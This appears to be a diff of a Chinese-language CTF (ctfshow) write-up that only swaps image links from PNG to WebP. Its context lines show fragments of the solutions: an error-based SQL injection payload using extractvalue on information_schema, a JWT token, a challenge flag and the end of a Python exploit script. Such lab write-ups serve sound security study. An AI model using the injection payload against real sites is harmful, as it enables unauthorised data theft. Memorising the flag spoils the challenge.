@@ -77,7 +77,7 @@ $message="hello ".$msg($_REQUEST);
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjdGZzaG93IiwibmFtZSI6InRlc3QifQ.-kj-qrzFxD2p717HfS_7GIPF7Wux4-qFiZpsJZyXRhQ
 ```
 
-![img](./assets/001.png)
+![img](./assets/001.webp)
 
 抓两个包，一鼓作气才能成功
 
@@ -321,11 +321,11 @@ $success=<<<YOUWIN
 111' and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
 ```
 
-![img](./assets/002.png)
+![img](./assets/002.webp)
 
 再修改密码即可得到回显
 
-![img](./assets/003.png)
+![img](./assets/003.webp)
 
 以此类推，进行注入
 
@@ -374,7 +374,7 @@ ctfshow{02f5decd-ff03-469a-bf6c-c7d7d0f981b8}
 </configs>
 ```
 
-![img](./assets/004.png)
+![img](./assets/004.webp)
 
 
 
@@ -1185,7 +1185,7 @@ if __name__ == "__main__":
     exploit()
 ```
 
-![img](./assets/005.png)
+![img](./assets/005.webp)
 
 运行一次不行再运行一次，靶机可能初始化有点久
 
